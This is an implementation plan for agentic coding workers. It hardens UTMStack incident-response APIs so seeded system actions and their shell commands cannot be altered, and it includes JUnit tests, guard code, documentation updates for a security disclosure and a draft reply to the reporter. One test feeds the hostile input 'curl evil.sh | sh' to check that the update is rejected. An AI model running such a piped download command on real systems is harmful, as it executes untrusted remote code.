# IR Role Model + Preset Immutability Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use subagent-driven-development (recommended) or executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Enforce that seeded system IR actions (`actionEditable=false`) are immutable via API for all roles, while keeping analyst (`ROLE_USER`) IR authoring open — per spec `docs/specs/2026-10-27-ir-role-model-design.md`.

**Architecture:** Guards live in the two service classes (`UtmIncidentActionService`, `UtmIncidentActionCommandService`), which are the only writers to these entities (verified by grep — the only callers are the two REST resources). Guards throw `ApiException(403)`; the resources get a `catch (ApiException) { throw e; }` rethrow (house pattern from #2909) so `GlobalExceptionHandler` returns 403 instead of the handler's catch-all turning it into 500. The role-opening edits (`SecurityConfiguration` + `UTMIncidentCommandWebsocket`) are **already committed** on this branch.

**Tech Stack:** Java 17, Spring Boot 3.1, JUnit 5 + JDK `Proxy` for repo stubs (no Mockito in repo; surefire runs tests from `src/main/java`).

**Working branch:** `fix/ir-role-model-v11.3.1` (main checkout). Tests run in Docker (this box is Java 25):

```bash
docker run --rm -v "C:\Users\osmon\.m2:/root/.m2" -v "D:\Projects\github.com\utmstack\UTMStack:/src" -w /src/backend maven:3.9-eclipse-temurin-17 sh -c 'mvn -B -o -Drevision=11.3.1 clean test -Dtest=<TestClass> -s settings.xml'
```

---

## File map

| File | Action | Responsibility |
|---|---|---|
| `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionService.java` | Modify | Reject update/delete of non-editable (system) actions |
| `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionCommandService.java` | Modify | Reject save/delete of command rows whose parent action is non-editable; gains `UtmIncidentActionRepository` dep |
| `backend/src/main/java/com/park/utmstack/web/rest/incident_response/UtmIncidentActionResource.java` | Modify | Rethrow `ApiException` in update + delete handlers (403 not 500) |
| `backend/src/main/java/com/park/utmstack/web/rest/incident_response/UtmIncidentActionCommandResource.java` | Modify | Rethrow `ApiException` in create + update + delete handlers |
| `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionServiceImmutabilityTest.java` | Create | Pin the action guard contract |
| `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionCommandServiceImmutabilityTest.java` | Create | Pin the command guard contract |
| `docs/2026-10-27-artiphishell-disclosure-verification.md` | Modify | Reclassify H1/M1/M3/M4 + C4/C5 per role-model decision |
| `docs/2026-10-27-artiphishell-reply-draft.md` | Create | Reply draft for the reporter |

---

## Task outline

1. **Task 1** — `UtmIncidentActionService` immutability guard (TDD: test → fail → impl → pass → commit)
2. **Task 2** — `UtmIncidentActionCommandService` parent-editable guard (TDD, same shape)
3. **Task 3** — Resource `ApiException` rethrows so the guard surfaces as 403 (compile + full test run)
4. **Task 4** — Update verification doc with the reclassification
5. **Task 5** — Write the reply draft to the reporter

---

### Task 1: `UtmIncidentActionService` — reject updates/deletes of system presets

**Files:**
- Test: `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionServiceImmutabilityTest.java` (create)
- Modify: `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionService.java`

- [ ] **Step 1: Write the failing test**

Create `UtmIncidentActionServiceImmutabilityTest.java` in `backend/src/main/java/com/park/utmstack/service/incident_response/`:

```java
package com.park.utmstack.service.incident_response;

import com.park.utmstack.domain.incident_response.UtmIncidentAction;
import com.park.utmstack.repository.incident_response.UtmIncidentActionRepository;
import com.park.utmstack.util.exceptions.ApiException;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ConcurrentHashMap;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Artiphishell disclosure (2026-10-27) / spec 2026-10-27-ir-role-model-design.md:
 * seeded system IR actions (actionEditable=false) must be immutable via API for
 * every role. Analyst-authored actions (actionEditable=true) stay editable.
 * Fail closed: a null flag (schema says nullable=false, but never trust the DB)
 * is treated as non-editable.
 */
class UtmIncidentActionServiceImmutabilityTest {

    private static final class RepoStore {
        final Map<Long, UtmIncidentAction> rows = new ConcurrentHashMap<>();
        boolean deleteCalled = false;
        long deletedId = -1;
    }

    /** In-memory UtmIncidentActionRepository stub (JDK Proxy, repo has no Mockito). */
    private static UtmIncidentActionRepository proxyRepo(RepoStore store) {
        InvocationHandler h = (proxy, method, args) -> {
            switch (method.getName()) {
                case "findById":
                    return Optional.ofNullable(store.rows.get((Long) args[0]));
                case "save":
                    UtmIncidentAction a = (UtmIncidentAction) args[0];
                    store.rows.put(a.getId(), a);
                    return a;
                case "deleteById":
                    store.deleteCalled = true;
                    store.deletedId = (Long) args[0];
                    store.rows.remove((Long) args[0]);
                    return null;
                case "toString":
                    return "testRepo";
                case "hashCode":
                    return System.identityHashCode(proxy);
                case "equals":
                    return proxy == args[0];
                default:
                    return null;
            }
        };
        return (UtmIncidentActionRepository) Proxy.newProxyInstance(
                UtmIncidentActionRepository.class.getClassLoader(),
                new Class<?>[]{UtmIncidentActionRepository.class}, h);
    }

    private static UtmIncidentAction action(long id, Boolean editable) {
        UtmIncidentAction a = new UtmIncidentAction();
        a.setId(id);
        a.setActionCommand(editable == null ? "NEW" : "SHUTDOWN_SERVER");
        a.setActionDescription("d");
        a.setCreatedUser("system");
        a.setActionEditable(editable);
        return a;
    }

    @Test
    void updateSystemPresetIsRejectedWith403() {
        RepoStore store = new RepoStore();
        store.rows.put(1L, action(1L, false));
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        UtmIncidentAction incoming = action(1L, false);
        incoming.setActionCommand("EVIL_CMD");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(incoming));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertEquals("SHUTDOWN_SERVER", store.rows.get(1L).getActionCommand(), "preset row must be untouched");
    }

    @Test
    void updateAnalystActionIsAllowed() {
        RepoStore store = new RepoStore();
        store.rows.put(20L, action(20L, true));
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        UtmIncidentAction incoming = action(20L, true);
        incoming.setActionCommand("MY_TOOL");
        UtmIncidentAction saved = svc.save(incoming);
        assertEquals("MY_TOOL", saved.getActionCommand());
        assertEquals("MY_TOOL", store.rows.get(20L).getActionCommand());
    }

    @Test
    void updateMissingActionIsRejectedWith404() {
        RepoStore store = new RepoStore();
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.save(action(999L, true)));
        assertEquals(HttpStatus.NOT_FOUND, ex.getStatus());
    }

    @Test
    void createIsNeverBlockedByTheGuard() {
        RepoStore store = new RepoStore();
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        UtmIncidentAction fresh = new UtmIncidentAction();
        fresh.setActionCommand("CUSTOM");
        fresh.setActionDescription("d");
        fresh.setCreatedUser("analyst");
        fresh.setActionEditable(true);
        // no id — create path
        UtmIncidentAction saved = svc.save(fresh);
        assertEquals("CUSTOM", saved.getActionCommand());
    }

    @Test
    void deleteSystemPresetIsRejectedWith403() {
        RepoStore store = new RepoStore();
        store.rows.put(1L, action(1L, false));
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(1L));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertFalse(store.deleteCalled, "repository deleteById must not be reached");
        assertTrue(store.rows.containsKey(1L));
    }

    @Test
    void deleteAnalystActionIsAllowed() {
        RepoStore store = new RepoStore();
        store.rows.put(20L, action(20L, true));
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        assertDoesNotThrow(() -> svc.delete(20L));
        assertTrue(store.deleteCalled);
        assertEquals(20L, store.deletedId);
        assertFalse(store.rows.containsKey(20L));
    }

    @Test
    void deleteMissingActionIsRejectedWith404() {
        RepoStore store = new RepoStore();
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(999L));
        assertEquals(HttpStatus.NOT_FOUND, ex.getStatus());
    }

    @Test
    void nullEditableFlagFailsClosed() {
        RepoStore store = new RepoStore();
        store.rows.put(5L, action(5L, null));
        UtmIncidentActionService svc = new UtmIncidentActionService(proxyRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(5L));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
    }
}
```

- [ ] **Step 2: Run test to verify it fails (compile error expected)**

Run:
```bash
docker run --rm -v "C:\Users\osmon\.m2:/root/.m2" -v "D:\Projects\github.com\utmstack\UTMStack:/src" -w /src/backend maven:3.9-eclipse-temurin-17 sh -c 'mvn -B -o -Drevision=11.3.1 clean test -Dtest=UtmIncidentActionServiceImmutabilityTest -s settings.xml'
```
Expected: COMPILE failure — `UtmIncidentActionService` still has no guard; `save`/`delete` never throw `ApiException`, and the test methods asserting 403/404 fail.

- [ ] **Step 3: Implement the guard in `UtmIncidentActionService`**

Modify `UtmIncidentActionService.java`. Add the import and replace the `save` and `delete` methods:

```java
import com.park.utmstack.util.exceptions.ApiException;
import org.springframework.http.HttpStatus;
```

Replace `save` (note the guard call is **before** the try, so the 403 `ApiException` is never wrapped — matching the existing `UtmIncidentActionService` which has no throws clause and returns the entity directly):
```java
    /**
     * Save a utmIncidentAction.
     *
     * <p>Seeded system presets (actionEditable=false) are immutable via API for
     * every role — analysts author their own actions, but the shared presets
     * (SHUTDOWN_SERVER, RUN_CMD, ...) cannot be rewritten or removed through
     * the service. Repairing a preset is a reseed/liquibase change.
     *
     * @param utmIncidentAction the entity to save
     * @return the persisted entity
     */
    public UtmIncidentAction save(UtmIncidentAction utmIncidentAction) {
        log.debug("Request to save UtmIncidentAction : {}", utmIncidentAction);
        if (utmIncidentAction.getId() != null) {
            requireEditable(utmIncidentAction.getId());
        }
        return utmIncidentActionRepository.save(utmIncidentAction);
    }

    private void requireEditable(Long id) {
        UtmIncidentAction existing = utmIncidentActionRepository.findById(id)
                .orElseThrow(() -> new ApiException("Incident action " + id + " not found", HttpStatus.NOT_FOUND));
        if (!Boolean.TRUE.equals(existing.getActionEditable())) {
            throw new ApiException("System incident action " + id + " is not editable", HttpStatus.FORBIDDEN);
        }
    }
```

Replace `delete`:
```java
    /**
     * Delete the utmIncidentAction by id.
     *
     * @param id the id of the utmIncidentAction
     */
    public void delete(Long id) {
        log.debug("Request to delete UtmIncidentAction : {}", id);
        requireEditable(id);
        utmIncidentActionRepository.deleteById(id);
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run the same command as Step 2.
Expected: `Tests run: 8, Failures: 0, Errors: 0, Skipped: 0` — BUILD SUCCESS.

- [ ] **Step 5: Commit**

```bash
git add backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionService.java backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionServiceImmutabilityTest.java
git commit -m "feat(ir): enforce immutability of system IR action presets

Seeded actions (actionEditable=false) can no longer be updated or
deleted via the API by any role. Analyst-authored actions are
unaffected. Closes the residual of the Artiphishell H1/M1/M3/M4
disclosure under the corrected ROLE_USER=analyst role model."
```

---

### Task 2: `UtmIncidentActionCommandService` — protect command rows under system presets

**Files:**
- Test: `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionCommandServiceImmutabilityTest.java` (create)
- Modify: `backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionCommandService.java`

Context: `utm_incident_action_command` rows carry the actual shell strings (`init 0`, `cmd.exe /c shutdown -s -t 0 -f`) that `UtmIncidentJobService.save` prepends to dispatched jobs. Protection is inherited from the parent action's `actionEditable` flag — the command table has no flag of its own.

- [ ] **Step 1: Write the failing test**

Create `UtmIncidentActionCommandServiceImmutabilityTest.java` in `backend/src/main/java/com/park/utmstack/service/incident_response/`:

```java
package com.park.utmstack.service.incident_response;

import com.park.utmstack.domain.incident_response.UtmIncidentAction;
import com.park.utmstack.domain.incident_response.UtmIncidentActionCommand;
import com.park.utmstack.repository.incident_response.UtmIncidentActionCommandRepository;
import com.park.utmstack.repository.incident_response.UtmIncidentActionRepository;
import com.park.utmstack.util.exceptions.ApiException;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ConcurrentHashMap;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Artiphishell disclosure (2026-10-27): the shell strings under seeded system
 * actions (SHUTDOWN_SERVER/RUN_CMD) must not be rewritable or removable via
 * the API. Guard is inherited from the parent action's actionEditable flag.
 */
class UtmIncidentActionCommandServiceImmutabilityTest {

    private static final class Store {
        final Map<Long, UtmIncidentAction> actions = new ConcurrentHashMap<>();
        final Map<Long, UtmIncidentActionCommand> commands = new ConcurrentHashMap<>();
        boolean deleteCalled = false;
        long deletedId = -1;
    }

    private static UtmIncidentActionRepository actionRepo(Store store) {
        InvocationHandler h = (proxy, method, args) -> {
            switch (method.getName()) {
                case "findById":
                    return Optional.ofNullable(store.actions.get((Long) args[0]));
                case "toString":
                    return "testActionRepo";
                case "hashCode":
                    return System.identityHashCode(proxy);
                case "equals":
                    return proxy == args[0];
                default:
                    return null;
            }
        };
        return (UtmIncidentActionRepository) Proxy.newProxyInstance(
                UtmIncidentActionRepository.class.getClassLoader(),
                new Class<?>[]{UtmIncidentActionRepository.class}, h);
    }

    private static UtmIncidentActionCommandRepository commandRepo(Store store) {
        InvocationHandler h = (proxy, method, args) -> {
            switch (method.getName()) {
                case "findById":
                    return Optional.ofNullable(store.commands.get((Long) args[0]));
                case "save":
                    UtmIncidentActionCommand c = (UtmIncidentActionCommand) args[0];
                    store.commands.put(c.getId(), c);
                    return c;
                case "deleteById":
                    store.deleteCalled = true;
                    store.deletedId = (Long) args[0];
                    store.commands.remove((Long) args[0]);
                    return null;
                case "toString":
                    return "testCommandRepo";
                case "hashCode":
                    return System.identityHashCode(proxy);
                case "equals":
                    return proxy == args[0];
                default:
                    return null;
            }
        };
        return (UtmIncidentActionCommandRepository) Proxy.newProxyInstance(
                UtmIncidentActionCommandRepository.class.getClassLoader(),
                new Class<?>[]{UtmIncidentActionCommandRepository.class}, h);
    }

    private static UtmIncidentAction action(long id, boolean editable) {
        UtmIncidentAction a = new UtmIncidentAction();
        a.setId(id);
        a.setActionCommand(editable ? "CUSTOM" : "SHUTDOWN_SERVER");
        a.setActionDescription("d");
        a.setCreatedUser("system");
        a.setActionEditable(editable);
        return a;
    }

    private static UtmIncidentActionCommand command(long id, long actionId, String cmd) {
        UtmIncidentActionCommand c = new UtmIncidentActionCommand();
        c.setId(id);
        c.setActionId(actionId);
        c.setOsPlatform("linux");
        c.setCommand(cmd);
        return c;
    }

    @Test
    void updateCommandUnderSystemPresetIsRejectedWith403() {
        Store store = new Store();
        store.actions.put(1L, action(1L, false));
        store.commands.put(10L, command(10L, 1L, "init 0"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand incoming = command(10L, 1L, "curl evil.sh | sh");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(incoming));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertEquals("init 0", store.commands.get(10L).getCommand(), "preset command must be untouched");
    }

    @Test
    void updateCommandUnderAnalystActionIsAllowed() {
        Store store = new Store();
        store.actions.put(20L, action(20L, true));
        store.commands.put(30L, command(30L, 20L, "mytool --scan"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand incoming = command(30L, 20L, "mytool --full");
        UtmIncidentActionCommand saved = svc.save(incoming);
        assertEquals("mytool --full", saved.getCommand());
    }

    @Test
    void createCommandUnderSystemPresetIsRejectedWith403() {
        Store store = new Store();
        store.actions.put(1L, action(1L, false));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand fresh = new UtmIncidentActionCommand();
        fresh.setActionId(1L);
        fresh.setOsPlatform("windows");
        fresh.setCommand("poc");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(fresh));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
    }

    @Test
    void createCommandWithUnknownParentIsRejectedWith404() {
        Store store = new Store();
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand fresh = new UtmIncidentActionCommand();
        fresh.setActionId(999L);
        fresh.setOsPlatform("linux");
        fresh.setCommand("x");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(fresh));
        assertEquals(HttpStatus.NOT_FOUND, ex.getStatus());
    }

    @Test
    void deleteCommandUnderSystemPresetIsRejectedWith403() {
        Store store = new Store();
        store.actions.put(1L, action(1L, false));
        store.commands.put(10L, command(10L, 1L, "init 0"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(10L));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertFalse(store.deleteCalled, "repository deleteById must not be reached");
    }

    @Test
    void deleteCommandUnderAnalystActionIsAllowed() {
        Store store = new Store();
        store.actions.put(20L, action(20L, true));
        store.commands.put(30L, command(30L, 20L, "mytool --scan"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        assertDoesNotThrow(() -> svc.delete(30L));
        assertTrue(store.deleteCalled);
        assertEquals(30L, store.deletedId);
    }

    @Test
    void deleteMissingCommandIsRejectedWith404() {
        Store store = new Store();
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(404L));
        assertEquals(HttpStatus.NOT_FOUND, ex.getStatus());
    }
}
```

- [ ] **Step 2: Run test to verify it fails (compile error expected)**

Run:
```bash
docker run --rm -v "C:\Users\osmon\.m2:/root/.m2" -v "D:\Projects\github.com\utmstack\UTMStack:/src" -w /src/backend maven:3.9-eclipse-temurin-17 sh -c 'mvn -B -o -Drevision=11.3.1 clean test -Dtest=UtmIncidentActionCommandServiceImmutabilityTest -s settings.xml'
```
Expected: COMPILE failure — `UtmIncidentActionCommandService` does not yet have a 2-arg constructor.

- [ ] **Step 3: Implement the guard in `UtmIncidentActionCommandService`**

Modify `UtmIncidentActionCommandService.java`. Add imports:
```java
import com.park.utmstack.domain.incident_response.UtmIncidentAction;
import com.park.utmstack.repository.incident_response.UtmIncidentActionRepository;
import com.park.utmstack.util.exceptions.ApiException;
import org.springframework.http.HttpStatus;
```

Replace the fields + constructor:
```java
    private final UtmIncidentActionCommandRepository incidentActionCommandRepository;
    private final UtmIncidentActionRepository utmIncidentActionRepository;

    public UtmIncidentActionCommandService(UtmIncidentActionCommandRepository incidentActionCommandRepository,
                                           UtmIncidentActionRepository utmIncidentActionRepository) {
        this.incidentActionCommandRepository = incidentActionCommandRepository;
        this.utmIncidentActionRepository = utmIncidentActionRepository;
    }
```

Replace `save`:
```java
    /**
     * Save a utmIncidentActionCommand.
     *
     * <p>Command rows inherit immutability from their parent action: the shell
     * strings under seeded system presets (SHUTDOWN_SERVER, RUN_CMD, ...) cannot
     * be rewritten or added through the API by any role.
     */
    public UtmIncidentActionCommand save(UtmIncidentActionCommand incidentActionCommand) throws Exception {
        final String ctx = CLASSNAME + ".save";
        try {
            requireParentEditable(incidentActionCommand.getActionId());
            return incidentActionCommandRepository.save(incidentActionCommand);
        } catch (ApiException e) {
            throw e;
        } catch (Exception e) {
            throw new Exception(ctx + ": " + e.getMessage());
        }
    }
```

Replace `delete`:
```java
    /**
     * Delete a utmIncidentActionCommand by id.
     *
     * @param id the id of the utmIncidentActionCommand
     */
    public void delete(Long id) throws Exception {
        final String ctx = CLASSNAME + ".delete";
        try {
            UtmIncidentActionCommand cmd = incidentActionCommandRepository.findById(id)
                    .orElseThrow(() -> new ApiException("Incident action command " + id + " not found", HttpStatus.NOT_FOUND));
            requireParentEditable(cmd.getActionId());
            incidentActionCommandRepository.deleteById(id);
        } catch (ApiException e) {
            throw e;
        } catch (Exception e) {
            throw new Exception(ctx + ": " + e.getMessage());
        }
    }

    private void requireParentEditable(Long actionId) {
        if (actionId == null) {
            throw new ApiException("Incident action command requires an actionId", HttpStatus.BAD_REQUEST);
        }
        UtmIncidentAction parent = utmIncidentActionRepository.findById(actionId)
                .orElseThrow(() -> new ApiException("Incident action " + actionId + " not found", HttpStatus.NOT_FOUND));
        if (!Boolean.TRUE.equals(parent.getActionEditable())) {
            throw new ApiException("Incident action command belongs to system action " + actionId + " and is not editable", HttpStatus.FORBIDDEN);
        }
    }
```

Keep `findAll` and `getCommand` untouched.

- [ ] **Step 4: Run test to verify it passes**

Run the same command as Step 2.
Expected: `Tests run: 7, Failures: 0, Errors: 0, Skipped: 0` — BUILD SUCCESS.

- [ ] **Step 5: Re-run Task 1's test to confirm no regression**

Run:
```bash
docker run --rm -v "C:\Users\osmon\.m2:/root/.m2" -v "D:\Projects\github.com\utmstack\UTMStack:/src" -w /src/backend maven:3.9-eclipse-temurin-17 sh -c 'mvn -B -o -Drevision=11.3.1 clean test -Dtest=UtmIncidentActionServiceImmutabilityTest -s settings.xml'
```
Expected: PASS (8 tests).

- [ ] **Step 6: Commit**

```bash
git add backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionCommandService.java backend/src/main/java/com/park/utmstack/service/incident_response/UtmIncidentActionCommandServiceImmutabilityTest.java
git commit -m "feat(ir): protect shell command strings under system IR presets

Command rows inherit immutability from the parent action's
actionEditable flag, so the seeded init 0 / shutdown strings
cannot be rewritten or removed via the API by any role."
```

---

### Task 3: Resource handlers — surface the guard as 403, not 500

**Files:**
- Modify: `backend/src/main/java/com/park/utmstack/web/rest/incident_response/UtmIncidentActionResource.java`
- Modify: `backend/src/main/java/com/park/utmstack/web/rest/incident_response/UtmIncidentActionCommandResource.java`

Context: both resources wrap every handler in `catch (Exception e) → 500 + ApplicationEventService.createEvent(...)`. Without a rethrow, the service's `ApiException(403)` becomes a 500 and pollutes the application events. House pattern (`ElasticsearchResource.java:195-198`, from #2909): add `catch (ApiException e) { throw e; }` before the generic catch. `GlobalExceptionHandler` (`advice/GlobalExceptionHandler.java:69`) returns the exception's own status.

**Important — do NOT add the rethrow to the CREATE handlers that cannot throw `ApiException` from the guard** (action create has no guard; command create can, so it does). Per-handler checklist is below.

- [ ] **Step 1: Patch `UtmIncidentActionResource`**

In `updateUtmIncidentAction` (PUT, ~line 89-109) and `deleteUtmIncidentAction` (DELETE, ~line 188-201), insert before the existing `catch (Exception e)`:
```java
        } catch (ApiException e) {
            // Intentional 4xx from the service guard (system preset immutability) —
            // rethrow so GlobalExceptionHandler returns 403, not 500 (#2909 pattern).
            throw e;
        } catch (Exception e) {
```
Add the import:
```java
import com.park.utmstack.util.exceptions.ApiException;
```
Leave `createUtmIncidentAction` (POST) and all GET handlers untouched.

- [ ] **Step 2: Patch `UtmIncidentActionCommandResource`**

In `createIncidentActionCommand` (POST, ~line 46-60), `updateIncidentActionCommand` (PUT, ~line 62-76), and `deleteIncidentActionCommand` (DELETE, ~line 94-107), insert the same `catch (ApiException e) { throw e; }` before the generic catch. Add the import:
```java
import com.park.utmstack.util.exceptions.ApiException;
```

- [ ] **Step 3: Compile + run both new test classes**

Run:
```bash
docker run --rm -v "C:\Users\osmon\.m2:/root/.m2" -v "D:\Projects\github.com\utmstack\UTMStack:/src" -w /src/backend maven:3.9-eclipse-temurin-17 sh -c 'mvn -B -o -Drevision=11.3.1 clean test -Dtest="UtmIncidentActionServiceImmutabilityTest,UtmIncidentActionCommandServiceImmutabilityTest" -s settings.xml'
```
Expected: BUILD SUCCESS, 15 tests pass.

- [ ] **Step 4: Run the full backend test suite**

Run:
```bash
docker run --rm -v "C:\Users\osmon\.m2:/root/.m2" -v "D:\Projects\github.com\utmstack\UTMStack:/src" -w /src/backend maven:3.9-eclipse-temurin-17 sh -c 'mvn -B -o -Drevision=11.3.1 clean test -s settings.xml'
```
Expected: BUILD SUCCESS, no new failures. (Pre-existing failures on v11 if any — compare against a clean run on v11 if in doubt; do not chase unrelated failures.)

- [ ] **Step 5: Commit**

```bash
git add backend/src/main/java/com/park/utmstack/web/rest/incident_response/UtmIncidentActionResource.java backend/src/main/java/com/park/utmstack/web/rest/incident_response/UtmIncidentActionCommandResource.java
git commit -m "fix(ir): return 403 for immutable system presets, not 500

Rethrow ApiException from the mutating IR handlers so the
GlobalExceptionHandler's status wins over the catch-all 500
(same pattern as #2909)."
```

---

### Task 4: Update the disclosure verification doc

**Files:**
- Modify: `docs/2026-10-27-artiphishell-disclosure-verification.md`

- [ ] **Step 1: Rewrite the H1/M1/M3/M4 sections**

In the verdict table (§1), change rows H1/M1/M3/M4 to:
- H1: `**By design** — ROLE_USER is the analyst and owns IR; preset immutability enforced instead` | **Fixed** (preset guard)
- M1: `Duplicate of H1; reclassified with H1` | reclassified
- M3: `**By design** for analyst-authored actions; system presets now immutable` | **Fixed** (preset guard)
- M4: `**Fixed** — system presets cannot be deleted; analyst actions still deletable` | fixed

In §2, replace the H1/M1, M3, M4 subsections with a single **"H1/M1/M3/M4 — reclassified (not missing authorization)"** subsection stating: the routes were never intended to be admin-only; ROLE_USER is the security analyst role and IR execution/authoring is its core function (product decision, 2026-10-27). The one real defect — unguarded seeded presets — is fixed by the `actionEditable` enforcement in `UtmIncidentActionService`/`UtmIncidentActionCommandService` (commits from Tasks 1-2). Add a line that `/api/utm-incident-jobs` and the console websocket were opened to `ROLE_USER` in the same branch (already committed).

- [ ] **Step 2: Rewrite the C4/C5 severity rationale**

Append to the existing C4/C5 subsection: the impact claim of "cross-tenant read" does not hold in this product — analysts read all logs by design, there is no per-tenant scoping to escape. Reclassify as code hygiene (string concat into OpenSearch SQL); kept in backlog, not accepted as a security finding.

- [ ] **Step 3: Update the recommended-response section**

Replace the P1 line with: "Incident-action authorization findings (H1/M1/M3/M4) reclassified as by-design under the ROLE_USER=analyst model; shipped preset immutability instead." Keep C1, SQL hygiene, and M2 items.

- [ ] **Step 4: Commit**

```bash
git add docs/2026-10-27-artiphishell-disclosure-verification.md
git commit -m "docs(verification): reclassify IR findings under the analyst role model"
```

---

### Task 5: Draft the reply to the reporter

**Files:**
- Create: `docs/2026-10-27-artiphishell-reply-draft.md`

- [ ] **Step 1: Write the draft**

Content (plain, professional, no legal language, no fix details beyond what we're saying we shipped):

```markdown
# Draft reply — Artiphishell disclosure (for user review before sending)

To: Jay Vadayath <[address from the thread]>
Subject: Re: Security disclosure : Multiple security issues in UTMStack v11

Hi Jay,

Thanks for the detailed reports — we've completed our independent review of all ten.

A few things we'd like to correct on our side of the record:

- The incident-response findings (the action/action-command update and delete
  endpoints) were written against the assumption those routes were meant to be
  admin-only. In UTMStack the standard user role is the security analyst, and
  authoring and executing incident-response playbooks is that role's core
  function — the routes were correct as shipped. What was NOT intended is that
  the seeded system presets (shutdown, isolate, run-cmd templates) could be
  modified or deleted by anyone; we've shipped enforcement that makes those
  immutable via the API. That fix is in our v11.3.1 cycle.

- The SQL-injection reports on the visualization filter builder (two of the
  five "critical" items describe the same code): we've reviewed the endpoints
  involved. Analysts have full read access to all log data by design in
  UTMStack, so the cross-tenant impact described does not apply. We're cleaning
  up the query construction as good hygiene anyway.

- The web-pdf and inputs-plugin items both require a network position that is
  already inside the deployment's own trust boundary; we've evaluated them and
  are treating them as hardening notes rather than vulnerabilities.

- The SAML metadata fetch item is valid as defense-in-depth; we're folding it
  into our own fix cycle.

We handle remediation internally and don't take paid patch engagements, so we
won't be moving forward commercially — but the technical content of the
disclosure was useful and we appreciate the coordination. The items above will
ship under our normal release process, and we'll be happy to confirm once
v11.3.1 is out.

Regards,
[Osmany]
```

- [ ] **Step 2: Present the draft to the user for approval (do not send anything)**

The user sends the reply himself (Gmail). Nothing in this task touches the mailbox.

- [ ] **Step 3: Commit**

```bash
git add docs/2026-10-27-artiphishell-reply-draft.md
git commit -m "docs(disclosure): reply draft for the Artiphishell findings"
```

---

## Post-plan (not part of this plan)

- Push branch `fix/ir-role-model-v11.3.1`, open PR → `v11` (v11 is gated: needs a non-author approval from utmstack/administrators, or the temporary bypass_actors pattern used for recent merges).
- C1 (SAML fetch-time validation), C4/C5 (SQL hygiene), M2 (constant-time compare) are **separate work items** in the same v11.3.1 train or later — each gets its own review/PR.
- Cut v11.3.1 from the merged v11 state per the release process (new version string — customers are not yet on v11.3.0).
